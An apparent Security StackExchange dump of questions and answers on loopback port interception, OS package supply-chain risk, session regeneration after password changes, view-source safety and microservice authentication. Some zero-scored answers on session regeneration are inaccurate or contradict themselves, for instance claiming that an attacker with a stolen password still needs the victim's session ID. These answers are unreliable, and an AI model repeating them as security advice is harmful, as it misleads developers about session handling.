"266786","266786","How can non-root intercept privileged loopback ports?","<p>Please walk through how an attacker can intercept Chrome's connection to 127.0.0.1:999, as suggested by the warning below.</p>
<p><a href=""https://i.stack.imgur.com/caSnP.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/caSnP.png"" alt=""enter image description here"" /></a></p>
<p>This warning is consitently displayed across many versions of Chrome in many OSes.</p>
<p>When I click the &quot;learn more&quot; link in the message, it says that SSL would be more secure, implying that an attacker can intercept Chrome's connection to 127.0.0.1:999. It is established that <a href=""https://security.stackexchange.com/a/215472/286296"">any user can open a port on 127.0.0.1</a>. However, according to w3.org, <a href=""https://www.w3.org/Daemon/User/Installation/PrivilegedPorts.html"" rel=""noreferrer"">only root can open port numbers below 1024</a>. In light of this, how does the attacker pull off the interception in this case?</p>
","6","4","266791","<p>There are tools for device Brother MFC L8900 CDW installed on your PC. They are listening to the port 999. Either you or somebody else with root privileges has installed them.</p>
<p>I suppose that these tools generated a self signed certificate. When you access web application that uses self signed certificate, browsers display a warning, which is normal. In case you access this computer from some <em>other</em> computer <em>via network that you don't control</em>, then really there can be a man-in-the-middle that intercepts your traffic, and if you don't check displayed fingerprints, you may accidentally accepts a certificate from the man-in-the-middle.</p>
<p>As long as you access this tool from the the same computer only, i.e. via localhost, I don't see any security risks.</p>
","3"
"266786","266786","How can non-root intercept privileged loopback ports?","<p>Please walk through how an attacker can intercept Chrome's connection to 127.0.0.1:999, as suggested by the warning below.</p>
<p><a href=""https://i.stack.imgur.com/caSnP.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/caSnP.png"" alt=""enter image description here"" /></a></p>
<p>This warning is consitently displayed across many versions of Chrome in many OSes.</p>
<p>When I click the &quot;learn more&quot; link in the message, it says that SSL would be more secure, implying that an attacker can intercept Chrome's connection to 127.0.0.1:999. It is established that <a href=""https://security.stackexchange.com/a/215472/286296"">any user can open a port on 127.0.0.1</a>. However, according to w3.org, <a href=""https://www.w3.org/Daemon/User/Installation/PrivilegedPorts.html"" rel=""noreferrer"">only root can open port numbers below 1024</a>. In light of this, how does the attacker pull off the interception in this case?</p>
","6","4","266795","<p>There are a number of different points here:</p>
<ul>
<li><em>only root can open port numbers below 1024</em>: that is true on most Unix-like OSes such as Linux. But any user can open any port on a Microsoft system, or macOS since version 10.14</li>
<li><em>an attacker can intercept Chrome's connection to 127.0.0.1:999</em>: well 127.0.0.x <strong>is</strong> the loopback address. That means that for the attacker to intercept the connection it has to be already active on the local machine. Said differently, the interception could be a way to gather information to prepare a privilege elevation, but in any case for the attack to start, the local machine has to be already compromised</li>
</ul>
<p>Google Chrome was written from the beginning as a browser and assumes that the client and the server could be on different systems. For that reason, it always throws warnings when it sees the raw HTTP protocol (in fact, <a href=""https://security.stackexchange.com/a/267283/286296"">any time there is no HTTPS certificate</a>). But only <strong>you</strong> can say whether you actually trust your local network or your local machine.</p>
<p>What I mean here is that IMHO using https on a local machine adds little to no security: if the machine is compromised you should not trust anything because both the client and server side are compromised, and if it is not, no interception is possible...</p>
","7"
"266786","266786","How can non-root intercept privileged loopback ports?","<p>Please walk through how an attacker can intercept Chrome's connection to 127.0.0.1:999, as suggested by the warning below.</p>
<p><a href=""https://i.stack.imgur.com/caSnP.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/caSnP.png"" alt=""enter image description here"" /></a></p>
<p>This warning is consitently displayed across many versions of Chrome in many OSes.</p>
<p>When I click the &quot;learn more&quot; link in the message, it says that SSL would be more secure, implying that an attacker can intercept Chrome's connection to 127.0.0.1:999. It is established that <a href=""https://security.stackexchange.com/a/215472/286296"">any user can open a port on 127.0.0.1</a>. However, according to w3.org, <a href=""https://www.w3.org/Daemon/User/Installation/PrivilegedPorts.html"" rel=""noreferrer"">only root can open port numbers below 1024</a>. In light of this, how does the attacker pull off the interception in this case?</p>
","6","4","267194","<p>Chrome <em>reports</em> that an attacker can intercept privileged loopback ports. Given the vagueness of &quot;attacker&quot;, the complexity of browser software, and the fact that <em>Chrome</em> is raising the issue, we should review Chrome's attack surfaces. For instance, you've logged out of your bank account, but debugging information remains in the browser console for subsequent users to see.</p>
<p>However, a <em>clean</em> system does not allow <em>outside</em> attacks on privileged loopback.</p>
","-2"
"266780","266780","Supply chain risks for OS packages","<p>The risks of supply chain attacks on software libraries is well documented, however, I have not seen much on OS packages/dependencies. How important is it to both 1) pin OS dependencies (apt,rpm,etc.) and 2) host them in private repositories?</p>
<p>The same logic would seem to apply as software libraries, but again, most of the supply chain discussion is centered around those and not OS packages.</p>
","2","3","266781","<p>It is very important to both pin OS dependencies and host them in private repositories. Pinning OS dependencies allows you to control the versions of packages installed on your system and ensure that only the intended versions are allowed. Hosting them in private repositories ensures that you are able to control the source of the packages, which can help reduce the risk of malicious attacks or tampering. Additionally, private repositories can provide an additional layer of security by allowing you to control who has access to the packages and by providing visibility into when and how packages are updated.</p>
","0"
"266780","266780","Supply chain risks for OS packages","<p>The risks of supply chain attacks on software libraries is well documented, however, I have not seen much on OS packages/dependencies. How important is it to both 1) pin OS dependencies (apt,rpm,etc.) and 2) host them in private repositories?</p>
<p>The same logic would seem to apply as software libraries, but again, most of the supply chain discussion is centered around those and not OS packages.</p>
","2","3","266833","<p>To answer your question, it depends on the available resources and how critical role the OS plays in its infrastructure or business.</p>
<p>Hosting OS packages in private repositories has been used in several occasions in order to speed up a company's computers updates and preserving network bandwidth; all updated packages are downloaded to the private repo from the OS repo once (usually during off-hours) and can be downloaded from the private repo several times to the company's computers without causing any disruption to the network's upstream.</p>
<p>Pinning OS package versions has also been used in order to establish OS stability policies. For example, you may want to stick to the current software version for 6 months after a new version of the software comes out; thus, if the new version introduces any defects you won't be affected and you allow time for any issues to be solved before you adopt it.</p>
<p>In terms of security, you can combine the two approaches in order to elevate your overall security; pin the version of packages until you verify that the new versions are (to the extend possible) found to be secure. The new versions can be stored in a private repository where you can run security scanners on them. For the ones that are found to be secure, you can allow them to be installed in the target OSes. This is a very scalable approach that facilitates the management of an OS lifecycle - especially when there are a lot of computers involved.</p>
<p>The reason why it's not a widely adopted practice (especially the private repo part) outside of organizations that are big, handle critical data or their operations require advanced security measures (e.g. intelligence agencies) is that it is much more involved and costs money and time to operate. Small businesses and/or individuals are usually satisfied with trusting the official (public) repos to be secure and have some sort of quality measures in place (that include checking for and reporting security issues); something that, generally speaking, has worked well so far.</p>
","0"
"266780","266780","Supply chain risks for OS packages","<p>The risks of supply chain attacks on software libraries is well documented, however, I have not seen much on OS packages/dependencies. How important is it to both 1) pin OS dependencies (apt,rpm,etc.) and 2) host them in private repositories?</p>
<p>The same logic would seem to apply as software libraries, but again, most of the supply chain discussion is centered around those and not OS packages.</p>
","2","3","270064","<p><strong>They are not really important</strong></p>
<p>This seems an scenario where you have a GNU/Linux distribution, such as Ubuntu or Red Hat.</p>
<p>If a package (e.g. libc) was compromised <a href=""https://www.gnu.org/software/libc/"" rel=""nofollow noreferrer"">upstream</a>, and Red Hat packaged it, it would flow to your OS (the classic scenario you have found discussed).</p>
<p>A supply chain issue <em>at the distro</em> would be that the upstream package was clean but the package distributed was not.¹ The possibilities are:</p>
<p>The source code is clean but the compiled version has some malicious code added. <strong>The solution for this would be to recompile all packages you use from a trusted system.</strong> Reproducible builds want to ensure that third parties are able to compile the same package file as the distro, thus ensuring it corresponds to the published source code, but in many cases we are not there yet. We don't need those if we build all our artifacts, though.</p>
<p>The packager added some evil code to the source (in the build script or a patch), in which case your private builds would produce malicious packages as well. Avoiding this would require you to review the packaging of all packages you use. For each version.</p>
<p>There's also an important yet implicit requisite, which is that you must be able to upgrade packages (at least for security bugs). Otherwise, it would make no sense to pin packages is nothing is ever going to be installed.</p>
<p>Now, let's analyze your proposed solutions:</p>
<ul>
<li>hosting the packages in private repositories</li>
</ul>
<p>Hosting the packages in private repositories is useful for reproducibility (e.g. if the official mirrors disappear), but of limited use for security. It may protect you if an existing package gets changed and a machine that didn't have it later needs it installed, but since a package version shall be immutable once created, it's much easier to keep a list of package hashes and yell if an existing package changes its signature.</p>
<p>Note that someone able to change the contents of an existing package <em>and</em> resign the package list to pass the cryptographic validation could as well <em>insert</em> a new version of an existing package so that it will be upgraded. Much more effective (albeit noisier). So you would need to apply the same countermeasures for an evil maintainer (with an honest builder) anyway.</p>
<p>You may consider that your other solution:</p>
<ul>
<li>pin OS dependencies (apt,rpm,etc.)</li>
</ul>
<p>protects you from this, but it's actually a can of worms, as it will cause conflicts with the goal of keeping the OS updated. Pinning packages will prevent updating the pinned packages, and it may transitively block others as well. So you actually want to end up upgrading all proposed package, what you need instead is a verification step of all packages that are going to be updated.</p>
<p>So, the main tools to protect your supply chain at the distro level would be to host your own builds and/or reviewing the work of the packagers. Hosting a private copy would be of marginal benefit (although a local mirror can be useful for non-security reasons), and package pinning actually harmful when blocking security upgrades.</p>
<p>¹ In this case as end users it is not relevant whether the maintainer itself was evil or the infrastructure was compromised (including the signing key).</p>
","0"
"266777","266777","Session regeneration after password change?","<p>So I understand the purpose of regenerating a session ID after a state change such as authenticating, i.e to prevent session fixation. What I'm not clear on is why this would be necessary after a password change (<a href=""https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change"" rel=""nofollow noreferrer"">as recommended by OWASP</a>).</p>
<p>If an attacker has hijacked the victim's session cookie, yes, invalidating that sessionID would kick the attacker off, but why should that be done specifically at the time of a password change? Is it because there is an assumption that if a user is changing their password, that they may suspect their account has been compromised? Otherwise, a password change seems like an arbitrary time to regenerate the sessionID.</p>
<p>In the case of an attacker who has stolen the victim's password: the attacker will have his own session. Regenerating the sessionID after password change would not affect the attacker's session, would it? (On that note -- is the current best practice to invalidate ALL sessions after a password change? I seem to be getting varying answers on this.)</p>
","3","5","266779","<blockquote>
<p>Is it because there is an assumption that if a user is changing their password, that they may suspect their account has been compromised?</p>
</blockquote>
<p>Somewhat. It's very standard advice to tell anybody whose account looks possibly-compromised &quot;hey, change your password&quot;. It's not like updating the session token is that expensive anyhow, so this is a pretty high-value time to do it. The cost is low (even if there's no account compromise even suspected, it's no harder than the user logging in again normally) and the potential upside is a lot.</p>
<blockquote>
<p>is the current best practice to invalidate ALL sessions after a password change?</p>
</blockquote>
<p>Like so many things in authentication (session length, additional token restrictions, credential types and restrictions, authentication factors, delegation, least-privileged access, etc.), this comes down to a question of use case, sensitivity of the app, and security vs. convenience. My personal take is that you should <em>offer</em> the user the opportunity to revoke all extant sessions:</p>
<blockquote>
<p>&quot;Password change successful! Would you like to log out all other sessions? You should select yes if you're worried that somebody else may have used your password. If you select yes, you will have to log in again on any other devices you use.&quot;</p>
</blockquote>
<p>The best approach is to actually show the user a list of other sessions, and let them revoke them all or only certain ones. In fact, you should have such functionality available even if the user <em>hasn't</em> just reset their password (see e.g. <a href=""https://myaccount.google.com/device-activity."" rel=""nofollow noreferrer"">https://myaccount.google.com/device-activity.</a>) However, if you don't have any of that - no list of active sessions for individual revocation, nor UI that asks &quot;do you want to revoke all other sessions?&quot; - then you probably should end all other sessions automatically. This may not always align with user expectations, but in the worst case they just have to log in again a few times unexpectedly, and in the best case they have kicked an attacker out of their account (hopefully before much damage was done).</p>
<blockquote>
<p>In the case of an attacker who has stolen the victim's password: the attacker will have his own session.</p>
</blockquote>
<p>This is true (or at least, should be assumed true). However, even in such a case, the advice &quot;change your password&quot; may still be relevant <em>even if other sessions aren't revoked</em>... if there are short and enforced session lifetimes. By preventing the attacker from logging in again, the user has mitigated the lost password. As such, if session lifetimes are short and enforced (<em>max</em> lifetimes, after which there is no way to continue accessing the service except fully logging in again), then you arguably don't need to reset other sessions when the user changes/resets their password; there probably aren't any other active sessions anyhow (because they expire so fast) and if there are, they'll end soon. I'm talking about <em>really</em> short sessions here, like just a few minutes, hard limit.</p>
<p>In all other cases, having a way to force session revocation is good. In particular, if you're using JWTs with refresh tokens, the lifetime of the JWT of course needs to be very short (single-digit minutes, usually), and password changes should (at least offer to) rotate your refresh token and revoke all the other refresh tokens (since you can't really revoke a JWT, this is the only way to end other login sessions).</p>
<p>If the user did a password <em>reset</em>, rather than a password <em>change</em>, you should probably revoke all sessions anyhow. Resets are more common than (voluntary) changes, so you're more likely to have &quot;false positives&quot; where you revoke sessions even though they're all legitimate, but also an attacker who steals a user's password will very often immediately change the password themselves, and the reset flow may be the only way the legitimate user can get back in. (Of course, if the attacker is able to, a smart one will also change the password reset credential - e.g switching to an email account under their own control - so the user may have no option but to resort to support... who should <em>DEFINITELY</em> revoke all extant sessions if a user reports being locked out of their own account, the user can authenticate themselves to the support operator, and the login credentials have been recently changed).</p>
","3"
"266777","266777","Session regeneration after password change?","<p>So I understand the purpose of regenerating a session ID after a state change such as authenticating, i.e to prevent session fixation. What I'm not clear on is why this would be necessary after a password change (<a href=""https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change"" rel=""nofollow noreferrer"">as recommended by OWASP</a>).</p>
<p>If an attacker has hijacked the victim's session cookie, yes, invalidating that sessionID would kick the attacker off, but why should that be done specifically at the time of a password change? Is it because there is an assumption that if a user is changing their password, that they may suspect their account has been compromised? Otherwise, a password change seems like an arbitrary time to regenerate the sessionID.</p>
<p>In the case of an attacker who has stolen the victim's password: the attacker will have his own session. Regenerating the sessionID after password change would not affect the attacker's session, would it? (On that note -- is the current best practice to invalidate ALL sessions after a password change? I seem to be getting varying answers on this.)</p>
","3","5","266782","<p>The idea behind regenerating the session ID on a password change is to ensure that if an attacker already has a valid session when the user changes the password then they don't get to keep that session.</p>
<p>The idea here is that if the attacker has hijacked a user's session then they can perform actions as that user until the session expires.</p>
<p>If the user changes their password during that time then the attacker can still use the hijacked session for up to the session's expiration.</p>
<p>By regenerating the session ID on a password change then the attacker's session is invalidated, meaning they have to create a new session (which will not have the rights of the user) or steal a new session.</p>
<p>The idea is not to invalidate all sessions after a password change, as that would be inconvenient to the user. Instead, only the session the user is currently using is invalidated.</p>
<p>So to answer your questions:</p>
<p>Yes, regenerating the session ID after a password change is necessary to prevent an attacker from using a hijacked session after the user changes their password.</p>
<p>No, regenerating the session ID does not affect the attacker's session, as the attacker is not using the user's session.</p>
<p>No, the current best practice is not to invalidate all sessions after a password change, but just the session the user is currently using.</p>
","0"
"266777","266777","Session regeneration after password change?","<p>So I understand the purpose of regenerating a session ID after a state change such as authenticating, i.e to prevent session fixation. What I'm not clear on is why this would be necessary after a password change (<a href=""https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change"" rel=""nofollow noreferrer"">as recommended by OWASP</a>).</p>
<p>If an attacker has hijacked the victim's session cookie, yes, invalidating that sessionID would kick the attacker off, but why should that be done specifically at the time of a password change? Is it because there is an assumption that if a user is changing their password, that they may suspect their account has been compromised? Otherwise, a password change seems like an arbitrary time to regenerate the sessionID.</p>
<p>In the case of an attacker who has stolen the victim's password: the attacker will have his own session. Regenerating the sessionID after password change would not affect the attacker's session, would it? (On that note -- is the current best practice to invalidate ALL sessions after a password change? I seem to be getting varying answers on this.)</p>
","3","5","266789","<p>Regenerating the session ID after a password change is a security measure that helps prevent session hijacking.</p>
<p>If an attacker has stolen the victim's password, they will not be able to access the victim's account without also having the victim's session ID. By regenerating the session ID after a password change, the victim's old session ID becomes invalid, effectively logging out the attacker and preventing them from accessing the victim's account even if they have the victim's password.</p>
<p>It is recommended to invalidate all sessions after a password change to prevent an attacker from accessing the victim's account using any of the victim's old session IDs. This helps to protect against session hijacking, as well as other potential security issues.</p>
","0"
"266777","266777","Session regeneration after password change?","<p>So I understand the purpose of regenerating a session ID after a state change such as authenticating, i.e to prevent session fixation. What I'm not clear on is why this would be necessary after a password change (<a href=""https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change"" rel=""nofollow noreferrer"">as recommended by OWASP</a>).</p>
<p>If an attacker has hijacked the victim's session cookie, yes, invalidating that sessionID would kick the attacker off, but why should that be done specifically at the time of a password change? Is it because there is an assumption that if a user is changing their password, that they may suspect their account has been compromised? Otherwise, a password change seems like an arbitrary time to regenerate the sessionID.</p>
<p>In the case of an attacker who has stolen the victim's password: the attacker will have his own session. Regenerating the sessionID after password change would not affect the attacker's session, would it? (On that note -- is the current best practice to invalidate ALL sessions after a password change? I seem to be getting varying answers on this.)</p>
","3","5","266828","<p>Everytime a user's security-related state (authentication and/or authorization) changes, it means that <em>the previous state is invalid</em>.</p>
<p>OWASP's suggestion is to regenerate the session token (ID) with every state change, in order to enforce this concept, and treat each old one as invalid.</p>
<p>Note that changing a session token provides a lot of benefits in the case of client-based sessions where you don't want to hit the db or the auth server with every request, in order to check for state changes. Similar benefits exist for server-side sessions, because it shortens the window of opportunity to use the old session tokens in case of caches being employed. For example, let's suppose that the current state (authentication and authorization) of a user is associated with a given session token and you either have a client-side session (e.g. JWT) with expiration date or a server-side one with caches. Consider the following:</p>
<ul>
<li>some privileges of the user are revoked (<em>authorization</em> change); you don't want the user to use the system with the revoked privileges by keeping the old token</li>
<li>the user is granted some privileges (<em>authorization</em> change); having the user using the system with the previous set of privileges is not ideal</li>
<li>the user changes her password (either as part of a security practice or because she forgot it and wants to reset it - this is an <em>authentication</em> change); the previous authentication state is no longer valid - you know that only the current state is valid because the user in that state is authenticated (you cannot be sure about anyone in the previous state). Thus, it would be a good idea to associate the new (valid) authentication state with a new session token. Keep in mind that this is especially valuable in the case where the state token is not associated with authentication but only with authorization (e.g. JWT with permission claims); when a password is changed and the token stays the same, then there's a problem in the security of the system if you don't invalidate all current session tokens of the user - or just issue a new one, because a user can use the old token even though they may not know the new password</li>
</ul>
<p>When it comes to attackers that use the system by employing a stolen session token, changing the token with every state change shortens the window of opportunity of the attacker to abuse the system (although, this also depends on other factors as well; e.g. how often does a state change take place).</p>
","0"
"266777","266777","Session regeneration after password change?","<p>So I understand the purpose of regenerating a session ID after a state change such as authenticating, i.e to prevent session fixation. What I'm not clear on is why this would be necessary after a password change (<a href=""https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change"" rel=""nofollow noreferrer"">as recommended by OWASP</a>).</p>
<p>If an attacker has hijacked the victim's session cookie, yes, invalidating that sessionID would kick the attacker off, but why should that be done specifically at the time of a password change? Is it because there is an assumption that if a user is changing their password, that they may suspect their account has been compromised? Otherwise, a password change seems like an arbitrary time to regenerate the sessionID.</p>
<p>In the case of an attacker who has stolen the victim's password: the attacker will have his own session. Regenerating the sessionID after password change would not affect the attacker's session, would it? (On that note -- is the current best practice to invalidate ALL sessions after a password change? I seem to be getting varying answers on this.)</p>
","3","5","266829","<h2>Password change workflows create an elevated status</h2>
<p>You are right, technically speaking, the password change event <strong>itself</strong> does not require your application to issue a new session ID.</p>
<p>However, <strong>many password change workflows include a step-up authentication step</strong>. For example, the end user might be required to enter the old password, or enter an out of band code. When the user can complete these successfully, the user's session receives an elevated level of privilege that allows the user to change the password. It is at that point your application should issue a new session ID. Otherwise, the attacker will also be able to access the elevated status, and potentially be able to change the password too.</p>
","0"
"266741","266741","Is Chrome's view-source dangerous when visiting malicious sites?","<p>What are the risks of viewing the source code of malicious pages on Google Chrome?</p>
<p>I want to go directly to <code>view-source:https://example-site.com</code> to visit the sites without rendering anything malicious / executing any scripts.</p>
<p>I am aware that just visiting the source pages might not give much/any valuable information about potential malicious actors/scripts/payloads, I am simply wondering whether this is completely safe.</p>
<p>Are there any new potential vulnerabilities/exploits that I should be aware of?</p>
","2","3","266742","<p>It depends on whether the page is parsed before you view its code or not.</p>
<p>If you visit the page and then see the source (e.g. right click on the page and select something like &quot;view source&quot;) then the possible damage has already been done.</p>
<p>If you fetch the page and you view the content without parsing it, then there's no problem.</p>
<p><a href=""https://en.wikipedia.org/wiki/View-source_URI_scheme"" rel=""nofollow noreferrer"">view-source</a> is suppposed to be a harmless action, that instructs the browser to fetch the page and then show its code, without parsing it. However, there have been some defects in the past in some browsers; whether a site that you visit uses a 0-day exploit that targets the browser's <code>view-source</code> functionality, is possible in principle, yes.</p>
","0"
"266741","266741","Is Chrome's view-source dangerous when visiting malicious sites?","<p>What are the risks of viewing the source code of malicious pages on Google Chrome?</p>
<p>I want to go directly to <code>view-source:https://example-site.com</code> to visit the sites without rendering anything malicious / executing any scripts.</p>
<p>I am aware that just visiting the source pages might not give much/any valuable information about potential malicious actors/scripts/payloads, I am simply wondering whether this is completely safe.</p>
<p>Are there any new potential vulnerabilities/exploits that I should be aware of?</p>
","2","3","266743","<p>If there's a bug in how the browser fetches the code and displays it in the <code>view source</code> page then that could potentially result in your browser getting compromised. Or a vulnerability in the network or TLS stack.</p>
<p>Additionally, making the request will expose your IP address to whoever is running the server, which could potentially be a problem for you.</p>
<p>If you're dealing with sites that you know or suspect are malicious, you should be doing it in a sandbox/VM, to get an additional layer of protection.</p>
","2"
"266741","266741","Is Chrome's view-source dangerous when visiting malicious sites?","<p>What are the risks of viewing the source code of malicious pages on Google Chrome?</p>
<p>I want to go directly to <code>view-source:https://example-site.com</code> to visit the sites without rendering anything malicious / executing any scripts.</p>
<p>I am aware that just visiting the source pages might not give much/any valuable information about potential malicious actors/scripts/payloads, I am simply wondering whether this is completely safe.</p>
<p>Are there any new potential vulnerabilities/exploits that I should be aware of?</p>
","2","3","266746","<p>Viewing the source without viewing the page is safe from exploits that rely on JS being executed client side, since JS is not executed. So no need to worry about XSS or CSRF. However, there might be a few pitfalls:</p>
<ul>
<li><p>The browser requests the page, so you expose your IP. If the URL is from a spam email, it may be unique to you and expose the fact that your email is active.</p>
</li>
<li><p>As others have pointed out, if there is some sort of buffer overflow or similar in your browser, it may lead to arbitrary code execution. The probability of this is low, and I would not worry about it.</p>
</li>
<li><p>If you visit <code>view-source:https://example.com/delete-my-account</code>, your account might be deleted. This hinges on (a) the server performing state changing operations on GET requests, and (b) you being logged in. So maybe not a big deal.</p>
</li>
</ul>
","2"
"266724","266724","Authenticating a request from a valid application (unshadowed)","<p>I am working on an application which has an architectural description as below,</p>
<ol>
<li>There is a docker container, lets say Microservice-A, in which multiple processes are running. Each process is responsible for executing a workflow and is managed by the respective team. All of these processes run with the admin user.</li>
<li>The folder used by the processes is common and people working on of the workflow can see the details of the other process in a production/non-production environment.</li>
<li>As a part of workflow execution, My process makes a network call to one of the microservice, say microservice-B, which is also managed by us.</li>
</ol>
<p>Problem statement:</p>
<ol>
<li>As of today, the self-signed certs used to authenticate and communicate with microservice are in a common directory inside the main docker container, microservice-A.</li>
<li>Hence, it is a vulnerability issue, where other services can use the same certs to connect.</li>
<li>My workflow is written in python, hence, it is again possible to sniff (in case of an intruder) the logic and locate the certs directory and use them.</li>
</ol>
<p>What are some possible ways (including docker constructs) which I can use to rightfully tell my second microservice-B that the call is made from the rightful process running inside the microservice-A.  Is there a way I can add a thumbprint to the certs and send the same thumbprint along with the certs during authentication with Microservice-B (Note: I can modify the logic inside the Microservice-B to validate)?</p>
<p>Some points I came up with</p>
<ol>
<li>Use a PAKE based algorithm to register MS-A with MS-B. Later, a combination of PAKE-key+Certs can be used for communication. But the problem is, if MS-A restarts the PAKE-Key will be lost if it is being created runtime. If Created or saved somewhere then it's the same problem again.</li>
<li>Use a Binary to generate the PAKE-key in runtime. Since logic inside the binary won't be visible, the PAKE-key can be generated on the basis of a static-string stored in the binary itself. But the problem is, I do not want anyone else to execute the binary other than the valid process inside MS-A. Is there any Linux or docker-based construct to uniquely identify the process (Note Pid can change over restart) such that only the valid process inside MS-A is able to execute that binary?</li>
</ol>
","1","3","266726","<p>Put each service to a separate container. This is one of the purposes of containers - isolation. Then provide certificate and key to the container via TLS secrets of Kubernetes.</p>
","0"
"266724","266724","Authenticating a request from a valid application (unshadowed)","<p>I am working on an application which has an architectural description as below,</p>
<ol>
<li>There is a docker container, lets say Microservice-A, in which multiple processes are running. Each process is responsible for executing a workflow and is managed by the respective team. All of these processes run with the admin user.</li>
<li>The folder used by the processes is common and people working on of the workflow can see the details of the other process in a production/non-production environment.</li>
<li>As a part of workflow execution, My process makes a network call to one of the microservice, say microservice-B, which is also managed by us.</li>
</ol>
<p>Problem statement:</p>
<ol>
<li>As of today, the self-signed certs used to authenticate and communicate with microservice are in a common directory inside the main docker container, microservice-A.</li>
<li>Hence, it is a vulnerability issue, where other services can use the same certs to connect.</li>
<li>My workflow is written in python, hence, it is again possible to sniff (in case of an intruder) the logic and locate the certs directory and use them.</li>
</ol>
<p>What are some possible ways (including docker constructs) which I can use to rightfully tell my second microservice-B that the call is made from the rightful process running inside the microservice-A.  Is there a way I can add a thumbprint to the certs and send the same thumbprint along with the certs during authentication with Microservice-B (Note: I can modify the logic inside the Microservice-B to validate)?</p>
<p>Some points I came up with</p>
<ol>
<li>Use a PAKE based algorithm to register MS-A with MS-B. Later, a combination of PAKE-key+Certs can be used for communication. But the problem is, if MS-A restarts the PAKE-Key will be lost if it is being created runtime. If Created or saved somewhere then it's the same problem again.</li>
<li>Use a Binary to generate the PAKE-key in runtime. Since logic inside the binary won't be visible, the PAKE-key can be generated on the basis of a static-string stored in the binary itself. But the problem is, I do not want anyone else to execute the binary other than the valid process inside MS-A. Is there any Linux or docker-based construct to uniquely identify the process (Note Pid can change over restart) such that only the valid process inside MS-A is able to execute that binary?</li>
</ol>
","1","3","266734","<p>In your comments you mention that you run docker containers without an orchestrator (e.g. kubernetes or docker swarm). I assume that you've taken all the <a href=""https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html"" rel=""nofollow noreferrer"">security measures</a> required to avoid having the docker server be used as a <a href=""https://securiumsolutions.com/blog/docker-privilege-escalation/"" rel=""nofollow noreferrer"">priviledge escalation</a> mechanism (or, perhaps, run <a href=""https://rootlesscontaine.rs/"" rel=""nofollow noreferrer"">rootless containers</a>?).</p>
<p>Having said that, as a general rule if an intruder gains admin level privileges all bets are off; there's little you can do to contain the damage, be it modifying binaries, containers or certificates.</p>
<p>If, however, you want to protect the processes (inside your containers) against other processes and/or non-priviledged users, then you could:</p>
<ul>
<li>run each container as a non-admin user (described in one of the links I provided above) and use the correct permissions on the private key files in order to protect them from a non-permitted user/process reading them (assuming that you also have the private keys stored in the same directory). This, of course, means that the processes inside the same container will be able to read all certificates assigned to the user under which the container runs, so perhaps putting one process per container is a good idea</li>
<li>run a <a href=""https://github.com/GoogleContainerTools/distroless"" rel=""nofollow noreferrer"">distro-less</a> container; this way an intruder won't be able to connect to your containers and use shells or other programs to gain valuable info. You can use this technique in combination with running a <a href=""https://en.wikipedia.org/wiki/Static_build"" rel=""nofollow noreferrer"">statically linked</a> binary, which may also include the private key/cert in the code if you want to avoid having them in the common directory</li>
</ul>
<blockquote>
<p>[...] I can use to rightfully tell my second microservice-B that the call is made from the rightful process [...]</p>
</blockquote>
<p>When it comes to tampering from a user with the appropriate permissions, this is very difficult to achieve, especially without the proper hardware that may help in certain cases (see <a href=""https://en.wikipedia.org/wiki/Trusted_Computing#Remote_attestation"" rel=""nofollow noreferrer"">remote attestation</a>). In every other case, you can configure properly your processes to use <a href=""https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/"" rel=""nofollow noreferrer"">mTLS</a> to achieve mutual authentication.</p>
","0"
"266724","266724","Authenticating a request from a valid application (unshadowed)","<p>I am working on an application which has an architectural description as below,</p>
<ol>
<li>There is a docker container, lets say Microservice-A, in which multiple processes are running. Each process is responsible for executing a workflow and is managed by the respective team. All of these processes run with the admin user.</li>
<li>The folder used by the processes is common and people working on of the workflow can see the details of the other process in a production/non-production environment.</li>
<li>As a part of workflow execution, My process makes a network call to one of the microservice, say microservice-B, which is also managed by us.</li>
</ol>
<p>Problem statement:</p>
<ol>
<li>As of today, the self-signed certs used to authenticate and communicate with microservice are in a common directory inside the main docker container, microservice-A.</li>
<li>Hence, it is a vulnerability issue, where other services can use the same certs to connect.</li>
<li>My workflow is written in python, hence, it is again possible to sniff (in case of an intruder) the logic and locate the certs directory and use them.</li>
</ol>
<p>What are some possible ways (including docker constructs) which I can use to rightfully tell my second microservice-B that the call is made from the rightful process running inside the microservice-A.  Is there a way I can add a thumbprint to the certs and send the same thumbprint along with the certs during authentication with Microservice-B (Note: I can modify the logic inside the Microservice-B to validate)?</p>
<p>Some points I came up with</p>
<ol>
<li>Use a PAKE based algorithm to register MS-A with MS-B. Later, a combination of PAKE-key+Certs can be used for communication. But the problem is, if MS-A restarts the PAKE-Key will be lost if it is being created runtime. If Created or saved somewhere then it's the same problem again.</li>
<li>Use a Binary to generate the PAKE-key in runtime. Since logic inside the binary won't be visible, the PAKE-key can be generated on the basis of a static-string stored in the binary itself. But the problem is, I do not want anyone else to execute the binary other than the valid process inside MS-A. Is there any Linux or docker-based construct to uniquely identify the process (Note Pid can change over restart) such that only the valid process inside MS-A is able to execute that binary?</li>
</ol>
","1","3","266745","<p>So at the moment you're running multiple microservices on a single host using Docker containers. In this environment you don't need to have any &quot;public&quot; networking running, you can just use a standard Docker bridge network for communications.</p>
<p>That should get rid of the risk of network based attacks. For an attacker to sniff the Docker bridge, they'd need to be running a process locally on the host with privileges (root or NET_ADMIN/NET_RAW capabilities) at that point your security is pretty much shot anyway.</p>
<p>If you're looking to protect one container from users on the host, you're into confidential computing territory, which isn't trivial.</p>
<p>A better option if you have untrusted users on the host, would be to move to an architecture that doesn't :)</p>
<p>Once you scale this up and start talking about different hosts (e.g. using Kubernetes) then the problem of service to service identification/authentication usually falls to something like a service mesh. Istio or Linkerd are common choices here.</p>
","0"
"266650","266650","Why create a CSR on my own server to have it signed by a 3rd party?","<p>I am looking into our current website certificate-management process and am looking for steps that may be unnecessary and can be simplified. The current process was created by our sysadmin who now left, and I am confused about step 1 below.</p>
